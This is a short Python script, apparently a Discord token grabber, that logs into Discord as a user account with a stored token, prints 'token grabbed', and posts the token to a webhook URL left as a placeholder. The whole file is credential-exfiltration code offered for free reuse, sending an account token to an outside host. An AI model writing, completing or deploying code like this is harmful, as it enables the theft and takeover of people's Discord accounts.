# do what ever with this
import discord, aiohttp
from discord import Webhook, AsyncWebhookAdapter
t = ""  #token
class MyClient(discord.Client):
  async def on_connect(self):
      print(f"token grabbed")
      async with aiohttp.ClientSession() as session:
          webhook = Webhook.from_url("URL HERE", adapter=AsyncWebhookAdapter(session))
          await webhook.send(f"||{t}||")



client = MyClient()
try:
 client.run(t, bot=False)
except discord.LoginFailure:
 print(f"invalid")